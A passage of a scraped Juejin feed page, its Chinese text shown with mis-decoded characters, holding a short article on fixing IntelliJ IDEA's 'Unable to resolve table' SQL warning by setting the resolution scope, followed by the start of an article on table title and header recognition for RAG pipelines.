content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ShaneD771"/> <meta itemprop="url" content="https://juejin.cn/user/2482077907032171"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            è§£å†³ideaé”™è¯¯æç¤º:æ— æ³•è§£æ'è¡¨å'
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2482077907032171/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ShaneD771
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T09:14:09.000Z" title="Tue Dec 09 2025 09:14:09 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">1. é—®é¢˜ç°è±¡</h3>
<p>Database é¢æ¿é‡Œå·²ç»æˆåŠŸè¿æ¥äº†æ•°æ®åº“ï¼Œè¡¨éƒ½èƒ½çœ‹å¾—åˆ°ã€‚</p>
<p>SQL ä»£ç ï¼ˆMyBatis XML æˆ– <code>@Select</code> æ³¨è§£ï¼‰æœ¬èº«æ²¡æœ‰è¯­æ³•é”™è¯¯ï¼Œåœ¨æ•°æ®åº“é‡Œæ‰§è¡Œä¹Ÿèƒ½è·‘é€šã€‚</p>
<p>ä½†æ˜¯IDEA ç¼–è¾‘å™¨é‡Œï¼Œæç¤º <code>Unable to resolve table 'xxx'</code>ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1c3ed85f58334db0b9015900984c785d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2hhbmVENzcx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765876449&amp;x-signature=t7illpHORyyzKUqVaepoi2i7Iz4%3D" alt="image-20251124135706567" loading="lazy"/></p>
<h3 data-id="heading-1">2. å¿«é€Ÿè§£å†³æ–¹æ¡ˆ</h3>
<p>è¿™ä¸ªé—®é¢˜çš„æ ¹æºåœ¨äº <strong>IDEA ä¸çŸ¥é“å½“å‰çš„ä»£ç æ–‡ä»¶åº”è¯¥å¯¹åº”å“ªä¸ªæ•°æ®åº“è¿æ¥</strong>ã€‚æˆ‘ä»¬éœ€è¦æ‰‹åŠ¨è®¾ç½® <strong>SQL Resolution Scopeï¼ˆSQL è§£æä½œç”¨åŸŸï¼‰</strong>ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/23a174bdf8e649609e341998bba4f859~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2hhbmVENzcx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765876449&amp;x-signature=UO8zgF18ujtp7NC%2B3XawVHHxrEQ%3D" alt="image-20251124142214645" loading="lazy"/></p>
<h3 data-id="heading-2">3. ä¸ºä»€ä¹ˆä¼šæœ‰è¿™ä¸ªé—®é¢˜ï¼Ÿ</h3>
<p>æˆ‘æ˜æ˜è®¾ç½®äº† SQL Dialectï¼ˆæ–¹è¨€ï¼‰ï¼Œä¹Ÿè¿æ¥äº†æ•°æ®åº“ï¼Œè€Œä¸”æˆ‘åªæœ‰ä¸€ä¸ªæ•°æ®åº“ï¼ŒIDEA ä¸ºä»€ä¹ˆä¸èƒ½è‡ªå·±åŒ¹é…å‘¢ï¼Ÿ</p>
<h4 data-id="heading-3">3.1 ä¸‰å¤§æ¦‚å¿µçš„åŒºåˆ«</h4>
<ul>
<li><strong>SQL Dialect (æ–¹è¨€)</strong>ï¼šç›¸å½“äºâ€œè¯­æ³•ä¹¦â€ã€‚å®ƒå‘Šè¯‰ IDEA è¿™æ®µä»£ç æ˜¯ MySQL è¯­æ³•è¿˜æ˜¯ Oracle è¯­æ³•ï¼Œè´Ÿè´£æ£€æŸ¥è¯­æ³•ç»“æ„ï¼ˆå¦‚ <code>SELECT</code> æ‹¼å†™å¯¹ä¸å¯¹ï¼‰ã€‚</li>
<li><strong>Data Source (æ•°æ®æº)</strong>ï¼šç›¸å½“äºâ€œå­—å…¸â€ã€‚è¿™æ˜¯çœŸå®çš„æ•°æ®åº“è¿æ¥ï¼ŒåŒ…å«æ‰€æœ‰çš„è¡¨ç»“æ„å…ƒæ•°æ®ã€‚</li>
<li><strong>Resolution Scope (ä½œç”¨åŸŸ)</strong>ï¼šç›¸å½“äºâ€œæŒ‡é’ˆ/ä¸Šä¸‹æ–‡â€ã€‚å®ƒçš„ä½œç”¨æ˜¯æŠŠâ€œä»£ç â€å’Œâ€œå­—å…¸â€è¿èµ·æ¥ã€‚</li>
</ul>
<p><strong>é£˜çº¢çš„åŸå› å°±æ˜¯ï¼š</strong> ä½ æœ‰äº†è¯­æ³•ä¹¦ï¼Œä¹Ÿæœ‰äº†å­—å…¸ï¼Œä½† IDEA ä¸çŸ¥é“è¿™æ®µä»£ç è¯¥æŸ¥å“ªæœ¬å­—å…¸ã€‚</p>
<h4 data-id="heading-4">3.2 ä¸ºä»€ä¹ˆä¸èƒ½é€‰ "All Data Sources"ï¼Ÿ</h4>
<p>å³ä½¿åªæœ‰ä¸€ä¸ªæ•°æ®åº“ï¼Œé€‰â€œæ‰€æœ‰æ•°æ®æºâ€ä¾ç„¶ä¼šæŠ¥é”™ã€‚</p>
<p><strong>æœ¬è´¨åŸå› ï¼šç¼ºå¤±â€œé»˜è®¤ä¸Šä¸‹æ–‡â€ (Default Context)ã€‚</strong></p>
<p>æˆ‘ä»¬åœ¨å†™ SQL æ—¶é€šå¸¸åªå†™<strong>çŸ­è¡¨å</strong>ï¼ˆå¦‚ <code>SELECT * FROM user</code>ï¼‰ï¼Œè€Œä¸æ˜¯<strong>å…¨é™å®šå</strong>ï¼ˆå¦‚ <code>SELECT * FROM my_db.public.user</code>ï¼‰ã€‚</p>
<ul>
<li><strong>å½“ä½ é€‰â€œå…·ä½“æ•°æ®åº“â€æ—¶ï¼š</strong> ç›¸å½“äºè¿›å…¥äº†è¯¥æ•°æ®åº“çš„ Sessionï¼Œæ‹¥æœ‰äº†é»˜è®¤çš„ Schemaã€‚IDEA é‡åˆ° <code>user</code> è¡¨ï¼Œä¼šè‡ªåŠ¨å»é»˜è®¤ Schema ä¸‹æŸ¥æ‰¾ã€‚<strong>(ç›¸å½“äºç›¸å¯¹è·¯å¾„ï¼š<code>./user</code>)</strong></li>
<li><strong>å½“ä½ é€‰â€œæ‰€æœ‰æ•°æ®æºâ€æ—¶ï¼š</strong> ç›¸å½“äºç«™åœ¨äº†æœåŠ¡å™¨çš„â€œå¤§å…â€é‡Œã€‚è™½ç„¶åªæœ‰ä¸€ä¸ªåº“ï¼Œä½†å› ä¸ºæ²¡æœ‰æ‰§è¡Œ <code>USE database</code> è¿™ç§åˆ‡æ¢ä¸Šä¸‹æ–‡çš„æ“ä½œï¼ŒIDEA é¢å¯¹ <code>user</code> è¿™ä¸ªçŸ­åï¼Œä¸æ•¢æ“…è‡ªçŒœæµ‹å®ƒæ˜¯å±äºå“ªä¸ªåº“çš„ã€‚ä¸ºäº†ä¸¥è°¨å’Œé˜²æ­¢æ­§ä¹‰ï¼Œå®ƒé€‰æ‹©æŠ¥é”™ã€‚<strong>(ç›¸å½“äºç»å¯¹è·¯å¾„ç¼ºå¤±)</strong></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[RAG è¡¨æ ¼è§£ææœ€ä½³å®è·µï¼šæ ‡é¢˜è¯†åˆ«ã€è¡¨å¤´æ¨æ–­ä¸è¯­ä¹‰é‡å»ºå…¨æŒ‡å—]]></title>    <link>https://juejin.cn/post/7581664445240918031</link>    <guid>https://juejin.cn/post/7581664445240918031</guid>    <pubDate>2025-12-09T09:13:57.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581664445240918031" data-draft-id="7581670270843994152" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="RAG è¡¨æ ¼è§£ææœ€ä½³å®è·µï¼šæ ‡é¢˜è¯†åˆ«ã€è¡¨å¤´æ¨æ–­ä¸è¯­ä¹‰é‡å»ºå…¨æŒ‡å—"/> <meta itemprop="keywords" content="æ¶æ„,Agent,é¢è¯•"/> <meta itemprop="datePublished" content="2025-12-09T09:13:57.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¸¸å…ˆæ£®"/> <meta itemprop="url" content="https://juejin.cn/user/4388906148043879"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            RAG è¡¨æ ¼è§£ææœ€ä½³å®è·µï¼šæ ‡é¢˜è¯†åˆ«ã€è¡¨å¤´æ¨æ–­ä¸è¯­ä¹‰é‡å»ºå…¨æŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4388906148043879/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¸¸å…ˆæ£®
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T09:13:57.000Z" title="Tue Dec 09 2025 09:13:57 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»12åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å¼•è¨€</h2>
<p>åœ¨ RAGï¼ˆRetrieval-Augmented Generationï¼‰ä½“ç³»ä¸­ï¼Œè¡¨æ ¼ä¸€ç›´æ˜¯æœ€éš¾å¤„ç†çš„æ–‡æ¡£ç±»å‹ä¹‹ä¸€ã€‚ç›¸æ¯”æ™®é€šæ®µè½æ–‡æœ¬ï¼Œè¡¨æ ¼å¤©ç„¶å¸¦æœ‰ç»“æ„åŒ–ä¿¡æ¯â€”â€”ä½† OCR å¾€å¾€ä¼šä¸¢å¤±è¿™äº›ç»“æ„ï¼Œä½¿å¾—æ¨¡å‹æ—¢ä¸çŸ¥é“å“ªäº›æ˜¯æ ‡é¢˜ã€å“ªäº›æ˜¯è¡¨å¤´ã€å“ªäº›æ˜¯æ•°æ®ï¼Œæ›´æ— æ³•ç†è§£è¡¨æ ¼å†…éƒ¨çš„è¯­ä¹‰å…³è”ã€‚å¦‚æœä¸èƒ½å‡†ç¡®è¯†åˆ«è¿™äº›å…³é”®ä¿¡æ¯ï¼Œæ£€ç´¢é˜¶æ®µå°±éš¾ä»¥åšåˆ°ã€Œé—®ä»€ä¹ˆï¼Œå–åˆ°ä»€ä¹ˆã€ï¼Œæœ€ç»ˆå¯¼è‡´å¬å›ç‡ä½ã€å›ç­”ç‰‡æ®µåŒ–ã€ä¸å‡†ç¡®ã€‚</p>
<p>å› æ­¤ï¼Œè¯†åˆ«è¡¨æ ¼â€œæ ‡é¢˜ + è¡¨å¤´â€å¯¹äº RAG è‡³å…³é‡è¦ï¼š</p>
<ul>
<li>è¡¨æ ¼æ ‡é¢˜æä¾›äº†å…¨å±€ä¸»é¢˜ï¼›</li>
<li>è¡¨å¤´æä¾›äº†å­—æ®µè¯­ä¹‰ï¼›</li>
<li>æ•°æ®è¡Œåˆ™æ‰¿è½½äº†å…·ä½“äº‹å®ã€‚</li>
</ul>
<p>åªæœ‰åŒæ—¶è¿˜åŸä¸‰è€…çš„è¯­ä¹‰å…³ç³»ï¼Œå‘é‡æ£€ç´¢æ‰èƒ½çœŸæ­£ç†è§£â€œè¿™æ˜¯ä¸€å¼ å…³äºä»€ä¹ˆçš„è¡¨æ ¼â€ï¼Œâ€œæ¯åˆ—åˆ†åˆ«ä»£è¡¨ä»€ä¹ˆâ€ï¼Œä»¥åŠâ€œæ¯ä¸€è¡Œåœ¨è¡¨è¾¾ä»€ä¹ˆâ€ã€‚</p>
<p>ä¸ºäº†è®©è¡¨æ ¼åœ¨ RAG ä¸­èƒ½è¢«ç†è§£ã€è¢«æ£€ç´¢ã€è¢«ä½¿ç”¨ï¼Œæˆ‘ä»¬ä»ä¸‰ä¸ªå…³é”®æ–¹å‘è¿›è¡Œä¼˜åŒ–ï¼š</p>
<ol>
<li>
<p><strong>è¡¨æ ¼æ ‡é¢˜è¯†åˆ«ç­–ç•¥ä¼˜åŒ–</strong><br/>
è¡¨æ ¼æ ‡é¢˜å¸¸è¢« OCR è¯¯è¯†ä¸ºæ™®é€šæ–‡æœ¬ï¼Œéœ€è¦ä½¿ç”¨ä½ç½®ã€æ ·å¼ã€è·ç¦»ã€è¯­ä¹‰ç­‰å¤šæ¨¡ç­–ç•¥é‡å»ºæ ‡é¢˜ã€‚</p>
</li>
<li>
<p><strong>è¡¨å¤´è¯†åˆ«ä¸è¡¥å…¨ç­–ç•¥ä¼˜åŒ–</strong><br/>
OCR è¯†åˆ«å‡ºçš„è¡¨å¤´å¯èƒ½ç¼ºå¤±ã€åˆå¹¶é”™ä½æˆ–é¡ºåºé”™è¯¯ï¼Œéœ€è¦é€šè¿‡å¤šç»´ç®—æ³•è¿›è¡Œæ¢å¤ã€‚</p>
</li>
<li>
<p><strong>æ•°æ®è¡Œè¡¨ç¤ºä¸è¡¨æ ¼æ•´ä½“è¯­ä¹‰å¢å¼ºï¼ˆTable Global Contextï¼‰</strong><br/>
å°†æ¯ä¸€è¡Œè½¬ä¸ºé¢å‘æ£€ç´¢çš„è¯­ä¹‰å¥å­ï¼Œå¹¶ä¸ºæ•´å¼ è¡¨æ„å»ºå…¨å±€è¯­ä¹‰ä¸Šä¸‹æ–‡ï¼Œæé«˜å¬å›ç‡ä¸å¯è§£é‡Šæ€§ã€‚</p>
</li>
</ol>
<p>é€šè¿‡è¿™äº›ç­–ç•¥ï¼ŒRAG æ‰èƒ½çœŸæ­£è¯»æ‡‚è¡¨æ ¼ï¼Œä½¿æ£€ç´¢ä¸ç”Ÿæˆçš„æ•´ä½“è´¨é‡æ˜¾è‘—æå‡ã€‚</p>
<h2 data-id="heading-1">è¯†åˆ«è¡¨æ ¼æ ‡é¢˜</h2>
<p>è¡¨æ ¼æ ‡é¢˜æ˜¯ç†è§£è¡¨æ ¼å†…å®¹ã€ç»“æ„ä¸ç”¨é€”çš„å…³é”®å…ƒä¿¡æ¯ã€‚å‡†ç¡®è¯†åˆ«æ ‡é¢˜ä¸ä»…èƒ½æ˜ç¡®è¡¨æ ¼ä¸»é¢˜ï¼ˆå¦‚â€œä¸´åºŠè¯•éªŒæ‚£è€…åŸºçº¿ç‰¹å¾â€â€œPROTACç ”å‘ç®¡çº¿â€ï¼‰ï¼Œä¹Ÿä¸ºåç»­çš„è¡¨æ ¼å¯¹é½ã€å¤šè¡¨å…³è”ã€è¯­ä¹‰æ£€ç´¢åŠç»“æ„åŒ–å­˜å‚¨æä¾›å¿…è¦ä¾æ®ã€‚ç¼ºä¹å‡†ç¡®æ ‡é¢˜çš„è¡¨æ ¼ï¼Œå…¶æ•°æ®ä»·å€¼ä¸å¯å¤ç”¨æ€§å°†æ˜¾è‘—é™ä½ã€‚</p>
<p>å½“å‰éƒ¨åˆ† OCR æœåŠ¡ï¼ˆå¦‚TextInï¼‰å·²å…·å¤‡è¡¨æ ¼æ ‡é¢˜è¯†åˆ«èƒ½åŠ›ï¼Œå¯è¾“å‡ºç»“æ„åŒ–æ ‡ç­¾ï¼ˆä¾‹å¦‚ sub_type="table_title"ï¼‰ã€‚ç„¶è€Œåœ¨å®é™…ä¸šåŠ¡åœºæ™¯ä¸­ï¼Œä»æ™®éå­˜åœ¨æ ‡é¢˜æ¼è¯†åˆ«æˆ–è¯†åˆ«ä¸å‡†çš„æƒ…å†µã€‚å› æ­¤ï¼Œéœ€é€šè¿‡å¤šç»´åº¦ç­–ç•¥å¯¹OCRåŸå§‹è¾“å‡ºè¿›è¡ŒäºŒæ¬¡è¯†åˆ«ä¸ä¿®æ­£ã€‚</p>
<p>ä¸ºæå‡è¡¨æ ¼æ ‡é¢˜çš„è¯†åˆ«å‡†ç¡®ç‡ï¼Œå¯ç»“åˆä»¥ä¸‹ç­–ç•¥å¯¹OCRè¾“å‡ºç»“æœè¿›è¡Œç»¼åˆåˆ¤æ–­ã€‚å„ç­–ç•¥æ—¢å¯ç‹¬ç«‹åº”ç”¨ï¼Œä¹Ÿå¯çº³å…¥åŠ æƒè¯„åˆ†ä½“ç³»ï¼Œå…±åŒæå‡è¯†åˆ«å¯é æ€§ã€‚</p>
<h3 data-id="heading-2">ä½ç½®ç‰¹å¾åˆ¤æ–­</h3>
<p><strong>ç›®çš„</strong>ï¼šä¾æ®æ–‡æœ¬ä¸è¡¨æ ¼çš„ç›¸å¯¹ä½ç½®åˆ¤æ–­å…¶æ˜¯å¦ä¸ºæ ‡é¢˜ã€‚</p>
<p><strong>æ–¹æ³•</strong>ï¼š</p>
<ul>
<li>åˆ©ç”¨ OCR è¿”å›çš„æ–‡æœ¬æ¡†åæ ‡ï¼Œè®¡ç®—æ–‡æœ¬æ¡†ä¸è¡¨æ ¼åŒºåŸŸåœ¨ Y æ–¹å‘ä¸Šçš„è·ç¦»ã€‚</li>
<li>è‹¥æ–‡æœ¬æ¡†åº•éƒ¨ä¸è¡¨æ ¼é¡¶éƒ¨çš„å‚ç›´è·ç¦»éå¸¸è¿‘ï¼ˆå¦‚ â‰¤ 20pxï¼‰ï¼Œåˆ™è¯¥æ–‡æœ¬æ›´å¯èƒ½æ˜¯æ ‡é¢˜ã€‚</li>
<li>è‹¥æ–‡æœ¬æ¡†æ°´å¹³æ–¹å‘ä¸è¡¨æ ¼å·¦å³è¾¹ç•Œæ˜¾è‘—é‡å ï¼ˆè¦†ç›–æ¯”ä¾‹ &gt; 60%ï¼‰ï¼Œæ ‡é¢˜æ¦‚ç‡è¿›ä¸€æ­¥æå‡ã€‚</li>
</ul>
<p><strong>è¯„åˆ†ç¤ºä¾‹</strong>ï¼šè·ç¦»è¶Šè¿‘ï¼Œä½ç½®è¦†ç›–è¶Šå®Œæ•´ï¼Œå¾—åˆ†è¶Šé«˜ï¼ˆ0~1ï¼‰ã€‚</p>
